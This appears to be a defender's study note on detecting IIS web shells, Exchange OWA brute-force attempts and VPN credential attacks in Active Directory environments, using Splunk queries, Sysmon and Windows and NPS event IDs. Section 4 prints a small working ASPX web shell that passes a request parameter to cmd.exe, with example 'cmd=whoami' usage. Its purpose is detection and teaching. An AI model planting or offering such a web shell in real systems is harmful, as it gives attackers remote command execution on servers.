# Active Directory Attack Surface: IIS, Web Shells, OWA, and VPN Detection Notes

## Overview

Active Directory (AD) changes the security impact of compromising a single service because many enterprise applications authenticate against the same centralized directory.

A standalone web server compromise may remain isolated to one host. In an AD environment, compromising an IIS-hosted application, Exchange OWA, or a VPN account can become an entry point to domain-wide resources.

This note summarizes three practical investigation scenarios:

1. IIS web shell activity
2. Exchange OWA brute-force attacks
3. VPN credential attacks using NPS/RADIUS

The main lesson is that no single log source tells the whole story. Effective investigation requires correlating web, endpoint, authentication, and directory events.

---

## 1. Active Directory and the Expanded Attack Surface

Services such as:

- IIS-hosted applications
- Microsoft Exchange
- SharePoint
- ADFS
- VPN gateways

may authenticate users against Active Directory.

This means that a vulnerability or stolen credential affecting one externally exposed service can potentially provide access to additional systems and resources inside the domain.

Useful Windows authentication events include:

- **4624** — Successful logon
- **4625** — Failed logon
- **4776** — Credential validation by a Domain Controller
- **4688** — Process creation, when command-line auditing is enabled

---

## 2. IIS Fundamentals

Internet Information Services (IIS) is Microsoft's web server platform.

Common products and applications hosted on IIS include:

- Exchange
- SharePoint
- ADFS
- Internal business applications

Default IIS access log location:

```text
C:\inetpub\logs\LogFiles\W3SVC1
```

IIS commonly uses W3C-style access logs.

### Important IIS Log Fields

| Field | Purpose |
|---|---|
| `c-ip` | Client/source IP address |
| `cs-uri-stem` | Requested URI path |
| `cs-uri-query` | Query string supplied with the request |
| `cs-method` | HTTP method such as GET or POST |
| `sc-status` | HTTP response status code |
| `cs(User-Agent)` | Browser or tool identifier |

### Time Zone Consideration

IIS records timestamps in **UTC**.

Windows Security events use the server's local time configuration.

When correlating events across sources, always account for the time-zone difference.

---

## 3. Normal vs Suspicious IIS Activity

Examples of normal patterns:

- Small numbers of login attempts
- Requests from expected office subnets
- GET requests to normal application pages
- Occasional 404 errors
- Normal OWA and internal application paths

Examples of suspicious patterns:

- Hundreds of authentication attempts from one IP
- Activity outside expected working hours
- Large bursts of 404 responses
- `.aspx` files in unusual directories
- Query strings such as `cmd=whoami`
- POST requests to directories that normally contain static files
- Command-line tools being launched by `w3wp.exe`

---

# Web Shell Investigation

## 4. What a Web Shell Is

A web shell is a malicious server-side script that allows an attacker to execute operating-system commands through HTTP requests.

On IIS, web shells often use the `.aspx` extension.

A simplified example:

```csharp
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
```

An attacker could then send commands using a query parameter such as:

```text
?cmd=whoami
```

Web shells are dangerous because they:

- Operate over normal web ports
- Can provide persistent remote command execution
- May survive reboots
- Do not require the attacker to install a separate remote-access tool

---

## 5. Core IIS Web Shell Detection Pattern

Under normal conditions, the IIS worker process:

```text
w3wp.exe
```

handles HTTP requests and generates responses.

A major detection signal is:

```text
w3wp.exe -> cmd.exe
```

or:

```text
w3wp.exe -> powershell.exe
```

Other unexpected command-line utilities launched by `w3wp.exe` should also be investigated.

Some legitimate .NET applications may cause IIS to launch processes such as:

```text
csc.exe
```

Therefore, the important factor is not only the child process name, but also the executed command line and surrounding activity.

---

## 6. Find IIS Directory Scanning

Attackers often probe many paths before exploiting an application.

Splunk query:

```spl
index=iis sc_status=404
| stats count by c_ip
| sort - count
```

### Purpose

This query:

- Filters IIS events with HTTP 404 responses
- Counts them by client IP
- Sorts the highest-volume sources first

A single IP producing hundreds of 404 responses in a short time may indicate automated directory or file scanning.

---

## 7. Find Successful Requests From the Suspicious IP

After identifying a suspicious source IP:

```spl
index=iis c_ip={SUSPICIOUS_IP} sc_status=200
| stats count by cs_uri_stem
| sort - count
```

### Purpose

This query reveals which paths the attacker successfully accessed.

Look for:

- Unexpected `.aspx` files
- Files in upload directories
- Files inside `/aspnet_client/`
- Rare or unusual application paths

---

## 8. Why `/aspnet_client/` Is Important

The path:

```text
/aspnet_client/
```

normally stores ASP.NET client-side resources.

A server-side `.aspx` file appearing there is highly suspicious.

Example:

```text
/aspnet_client/system_web/shell.aspx
```

A web shell in this location may indicate that an attacker successfully wrote a malicious file into a directory accessible by IIS.

---

## 9. Investigate Web Shell Requests

After identifying the web shell filename:

```spl
index=iis cs_uri_stem="*/{WEBSHELL_FILENAME}"
| table _time, c_ip, cs_method, cs_uri_query, sc_status
| sort _time
```

### Purpose

This query shows:

- When the shell was accessed
- Which IP interacted with it
- Whether GET or POST was used
- Commands or parameters supplied through the query string
- HTTP response status

Important field:

```text
cs_uri_query
```

This may expose reconnaissance or command execution such as:

```text
cmd=whoami
```

```text
cmd=ipconfig
```

---

## 10. Trace Commands Spawned by IIS With Sysmon

Sysmon Event ID 1 records process creation.

Splunk query:

```spl
index=win EventCode=1 ParentImage="*\\w3wp.exe"
| table _time, ParentImage, CommandLine
| sort _time
```

### Purpose

This query identifies processes started by the IIS worker process.

Suspicious examples include:

```text
cmd.exe /c whoami
```

```text
powershell.exe ...
```

```text
whoami.exe
```

```text
ipconfig.exe
```

This endpoint evidence helps confirm that HTTP requests seen in IIS logs resulted in actual operating-system command execution.

---

## 11. Find When the Web Shell Was Created

Sysmon Event ID 11 records file creation.

Splunk query:

```spl
index=win EventCode=11 TargetFilename="*{WEBSHELL_FILENAME}"
| table _time, Image, TargetFilename
```

### Purpose

This identifies:

- The exact time the file was created
- The process responsible
- The full target path

This is useful for establishing the initial compromise timeline.

---

## 12. Alternative Web Shell Deployment Detection

If Sysmon Event ID 11 is unavailable:

```spl
index=iis cs_method=POST cs_uri_query="*{WEBSHELL_FILENAME}"
| table _time, c_ip, cs_uri_stem, cs_uri_query, sc_status
| sort _time
```

### Purpose

This searches for POST requests that may have uploaded or created the malicious `.aspx` file.

---

# Exchange OWA Investigation

## 13. Exchange, Outlook, and OWA

Important distinction:

- **Exchange** — Email server platform
- **Outlook** — Desktop email client
- **OWA** — Outlook Web Access, the browser interface hosted on IIS

Important Exchange paths:

```text
/owa
```

OWA login and mailbox web interface.

```text
/ecp
```

Exchange Control Panel / administrative interface.

Access to `/ecp` should generally receive additional scrutiny because it can expose administrative functionality.

---

## 14. Normal OWA Authentication

A normal login commonly includes:

```text
POST /owa/auth.owa
```

followed by an HTTP:

```text
302
```

redirect.

A failed login can also return HTTP 302.

Therefore:

```text
sc_status=302
```

alone cannot reliably distinguish a successful login from a failed one.

OWA may include:

```text
reason=2
```

in the query string when authentication fails.

---

## 15. Detect OWA Brute-Force Activity

Splunk query:

```spl
index=iis cs_uri_stem="/owa/auth.owa" cs_method=POST
| bin _time span=5m
| stats count by _time, c_ip
| where count > 10
| sort - count
```

### Purpose

This query:

- Finds authentication POST requests
- Groups them into five-minute windows
- Counts attempts per source IP
- Highlights unusually high authentication volume

This can indicate:

- Brute force
- Password spraying
- Automated credential testing

At the IIS level, brute force and password spraying may look similar because the username may not be available.

---

## 16. Identify the Targeted Account

Use Windows Security Event 4625:

```spl
index=win EventCode=4625
| stats count by user, Logon_Type
| sort - count
```

### Purpose

This groups failed logons by account and logon type.

A user with a very high number of failures may be the brute-force target.

For IIS-hosted application authentication, a common value is:

```text
Logon_Type=8
```

Logon Type 8 is:

```text
NetworkCleartext
```

---

## 17. Determine Whether the Attack Succeeded

After identifying the target user:

```spl
index=win EventCode IN (4624, 4625) user="{TARGETED_USER}" Logon_Type=8
| table _time, EventCode, user, Process_Name, Logon_Type
| sort _time
```

### Purpose

This creates an authentication timeline for the account.

Important pattern:

```text
4625
4625
4625
4625
4624
```

Many failures followed by a success may indicate that the attacker eventually guessed or obtained the correct credentials.

---

## 18. IIS vs Windows Security Logs During OWA Attacks

IIS logs are best for identifying:

- Remote source IP
- Requested URI
- HTTP method
- Request volume
- Application paths

Windows Security logs are best for identifying:

- Username
- Successful authentication
- Failed authentication
- Logon type
- Local authentication context

The Windows `Source_Network_Address` may be empty or local because IIS handles authentication locally.

Therefore, use IIS logs for the attacker's true web source IP.

---

## 19. Check Post-Authentication Exchange Activity

Splunk query:

```spl
index=iis c_ip="{ATTACKER_IP}"
| stats count by cs_uri_stem
| sort - count
```

### Purpose

This reveals which application paths the attacker accessed after authentication.

High-value paths include:

```text
/ecp
```

and:

```text
/powershell
```

Access to these paths can indicate escalation beyond basic mailbox access.

---

# VPN Credential Attack Investigation

## 20. VPN Authentication and Active Directory

VPN gateways are often non-Windows devices such as:

- Fortinet
- Cisco
- Palo Alto
- Ivanti

Many environments authenticate VPN users through RADIUS.

On Windows, the RADIUS role is provided by:

```text
NPS
```

Network Policy Server.

Typical flow:

```text
VPN Gateway -> RADIUS/NPS -> Active Directory
```

If the gateway authenticates directly against AD through LDAP, NPS events may not exist.

---

## 21. Important NPS Event IDs

| Event ID | Meaning |
|---|---|
| `6272` | NPS granted access |
| `6273` | NPS denied access |
| `6274` | NPS discarded the request |

---

## 22. Important NPS Reason Codes

For Event ID 6273:

| Reason Code | Meaning |
|---|---|
| `16` | Unknown username or bad password |
| `48` | No matching network policy |
| `65` | RADIUS shared secret mismatch |

Reason code:

```text
16
```

is especially relevant to credential attacks.

Reason codes 48 and 65 usually indicate policy or configuration problems rather than a credential attack.

---

## 23. Identify VPN Credential-Attack Scope

Splunk query:

```spl
index=win EventCode=6273
| stats count by User_Account_Name, Client_IP_Address
| sort - count
```

### Purpose

This identifies:

- Accounts experiencing denied VPN logins
- The RADIUS client forwarding the request
- High-volume authentication failures

Important:

```text
Client_IP_Address
```

in an NPS event usually identifies the VPN gateway or RADIUS client, not necessarily the attacker's public IP.

---

## 24. Check Whether the VPN Account Was Compromised

Splunk query:

```spl
index=win EventCode IN (6273,6272) User_Account_Name={COMPROMISED_USER}
| table _time, EventCode, User_Account_Name, Client_IP_Address
```

### Purpose

This shows failures and successes for the account.

Suspicious pattern:

```text
6273
6273
6273
6273
6272
```

Many denied requests followed by a granted request may indicate successful credential compromise.

---

## 25. Correlate VPN Activity With Windows Logons

Splunk query:

```spl
index=win EventCode IN (4624, 4625) user={COMPROMISED_USER}
| table _time, host, user, EventCode, Logon_Type
| sort _time
```

### Purpose

This helps correlate:

- NPS authentication
- Local Windows logon events
- Host involved in authentication
- Successful and failed attempts

If NPS runs on the Domain Controller, 4624/4625 events may appear there.

If NPS runs on a separate server:

- 4624/4625 events generally appear on the NPS server
- The Domain Controller may log Event 4776 for credential validation

---

# Key Programs and Components

## Splunk

Used to search, aggregate, correlate, and investigate events across multiple log sources.

Important SPL commands used:

```spl
stats
```

Aggregates and counts events.

```spl
sort
```

Orders results.

```spl
table
```

Displays selected fields.

```spl
bin
```

Groups timestamps into time windows.

```spl
where
```

Filters results based on calculated conditions.

---

## IIS

Microsoft web server platform.

Important process:

```text
w3wp.exe
```

This is the IIS worker process.

Security relevance:

Unexpected command interpreters or reconnaissance tools launched as child processes of `w3wp.exe` may indicate web shell activity or application exploitation.

---

## Sysmon

Sysinternals System Monitor provides detailed endpoint telemetry.

Important event IDs used here:

```text
1  - Process Create
11 - File Create
```

These events help confirm:

- Which commands executed
- Which parent process launched them
- When malicious files were created

---

## Windows Security Log

Important Event IDs:

```text
4624 - Successful logon
4625 - Failed logon
4688 - Process creation
4776 - Credential validation
```

These events are useful for authentication and endpoint investigation.

---

## NPS

Network Policy Server provides Microsoft's RADIUS implementation.

Important Event IDs:

```text
6272 - Access granted
6273 - Access denied
6274 - Request discarded
```

NPS logs are especially useful when investigating VPN authentication.

---

# Investigation Methodology

A useful general workflow is:

```text
Identify anomaly
    ->
Identify source
    ->
Identify target
    ->
Confirm authentication result
    ->
Correlate endpoint activity
    ->
Investigate post-compromise behavior
```

For IIS:

```text
404 burst
    ->
Suspicious source IP
    ->
Successful URI access
    ->
Suspicious .aspx
    ->
w3wp.exe child process
    ->
File creation
```

For OWA:

```text
High-volume POST /owa/auth.owa
    ->
Source IP
    ->
4625 target account
    ->
4624 success
    ->
Check /ecp and /powershell
```

For VPN:

```text
6273 failures
    ->
Target account
    ->
6272 success
    ->
4624/4625 correlation
    ->
Trace later session activity
```

---

# Key Takeaways

- Active Directory increases the impact of compromising internet-facing services because authentication is centralized.
- IIS logs are excellent for identifying source IPs, paths, HTTP methods, and suspicious request patterns.
- Windows Security logs provide the account identity and authentication outcome that IIS may not expose.
- Sysmon is highly valuable for proving that a web request caused actual command execution or file creation.
- `w3wp.exe` spawning `cmd.exe`, PowerShell, or unusual utilities is a strong web-shell investigation signal.
- A large number of 404 responses from one IP may indicate directory scanning.
- OWA brute-force activity often appears as repeated POST requests to `/owa/auth.owa`.
- HTTP 302 alone does not prove whether an OWA login succeeded.
- Event 4625 followed by Event 4624 can indicate a successful credential attack.
- `/ecp` and `/powershell` are important Exchange paths to inspect after account compromise.
- NPS Event 6273 represents denied VPN access and Event 6272 represents granted access.
- NPS reason codes help distinguish attacks from configuration problems.
- NPS `Client_IP_Address` may identify the VPN gateway rather than the true remote attacker.
- Always correlate multiple log sources instead of relying on one event type.
- Always normalize timestamps before building an incident timeline.

---

# Quick Reference

## Web Shell Detection

```spl
index=iis sc_status=404
| stats count by c_ip
| sort - count
```

```spl
index=iis c_ip={SUSPICIOUS_IP} sc_status=200
| stats count by cs_uri_stem
| sort - count
```

```spl
index=iis cs_uri_stem="*/{WEBSHELL_FILENAME}"
| table _time, c_ip, cs_method, cs_uri_query, sc_status
| sort _time
```

```spl
index=win EventCode=1 ParentImage="*\\w3wp.exe"
| table _time, ParentImage, CommandLine
| sort _time
```

```spl
index=win EventCode=11 TargetFilename="*{WEBSHELL_FILENAME}"
| table _time, Image, TargetFilename
```

## OWA Brute Force

```spl
index=iis cs_uri_stem="/owa/auth.owa" cs_method=POST
| bin _time span=5m
| stats count by _time, c_ip
| where count > 10
| sort - count
```

```spl
index=win EventCode=4625
| stats count by user, Logon_Type
| sort - count
```

```spl
index=win EventCode IN (4624, 4625) user="{TARGETED_USER}" Logon_Type=8
| table _time, EventCode, user, Process_Name, Logon_Type
| sort _time
```

```spl
index=iis c_ip="{ATTACKER_IP}"
| stats count by cs_uri_stem
| sort - count
```

## VPN Credential Attack

```spl
index=win EventCode=6273
| stats count by User_Account_Name, Client_IP_Address
| sort - count
```

```spl
index=win EventCode IN (6273,6272) User_Account_Name={COMPROMISED_USER}
| table _time, EventCode, User_Account_Name, Client_IP_Address
```

```spl
index=win EventCode IN (4624, 4625) user={COMPROMISED_USER}
| table _time, host, user, EventCode, Logon_Type
| sort _time
```
